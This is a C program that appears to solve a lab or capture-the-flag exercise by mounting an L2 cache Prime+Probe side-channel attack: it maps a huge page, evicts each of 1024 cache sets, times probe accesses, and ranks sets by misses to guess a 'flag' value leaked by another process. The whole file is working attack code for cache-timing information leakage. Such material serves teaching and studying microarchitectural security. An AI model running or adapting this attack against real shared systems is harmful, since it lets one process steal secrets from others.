#include "util.h"
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define HUGE_PAGE_SIZE (2 * 1024 * 1024)
#define L2_STEP_SIZE 65536 // 2^16 keeps the set index the same, changes the tag
#define MISS_THRESHOLD 140 
#define UPPER_MISS_THRESHOLD 800 

void* allocate_huge_page() {
    void *buffer = mmap(NULL, HUGE_PAGE_SIZE, PROT_READ | PROT_WRITE, 
                         MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    if (buffer == (void*) -1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    return buffer;
}

uint8_t* get_set_addr(uint8_t *buffer, int target_set) {
    // Bits 6-15 determine the L2 set index
    return buffer + (target_set << 6);
}

void evict_l2_set(uint8_t *buffer, int target_set) {
    uint8_t *set_addr = get_set_addr(buffer, target_set);
    volatile uint8_t tmp;
    // L2 is 16-way associative
    for (int i = 0; i < 16; i++) {
        uint8_t *eviction_addr = set_addr + (i * L2_STEP_SIZE);
        tmp = *eviction_addr;
        asm volatile("mfence" ::: "memory");
    }
}

int probe_cache_set(uint8_t *buffer, int target_set) {
    uint8_t *set_addr = get_set_addr(buffer, target_set);
    int misses = 0;
    for (int i = 0; i < 16; i++) {
        int mixed_i = (i * 5) & 0xF;
        uint8_t *probe_addr = set_addr + (mixed_i * L2_STEP_SIZE);

        asm volatile("lfence" ::: "memory");
        uint32_t probe_time = measure_one_block_access_time((uint64_t)probe_addr);
        asm volatile("lfence" ::: "memory");

        if (probe_time > MISS_THRESHOLD && probe_time < UPPER_MISS_THRESHOLD) {
            misses++;
        }
    }
    return misses;
}

int main(int argc, char const *argv[]) {

    void *buffer = allocate_huge_page();
    for (int i = 0; i < HUGE_PAGE_SIZE; i += 4096) {
        ((uint8_t*)buffer)[i] = 1;
    }

    int scores[1024] = {0};

    for (int i = 0; i < 10000; i++) {
        for (int step = 0; step < 1024; step++) {
            int target_set = (step * 167) & 0x3FF;

            evict_l2_set(buffer, target_set);

            for (volatile int w = 0; w < 2000; w++) {}

            int misses = probe_cache_set(buffer, target_set);
 
            // count 1-8 to capture any activity while filtering noise
            if (misses >= 1 && misses <= 8) {
                scores[target_set]++;
            }
        }
    }

    printf("\nTOP 5 SCORES\n");
    for (int rank = 0; rank < 5; rank++) {
        int max_miss = -1;
        int flag_guess = -1;

        for (int j = 0; j < 1024; j++) {
            if (scores[j] > max_miss) {
                max_miss = scores[j];
                flag_guess = j;
            }
        }

        if (flag_guess != -1) {
            printf("#%d -> Flag: %d (Score: %d)\n", rank + 1, flag_guess, max_miss);
            scores[flag_guess] = -1; 
        }
    }

    return 0;
}
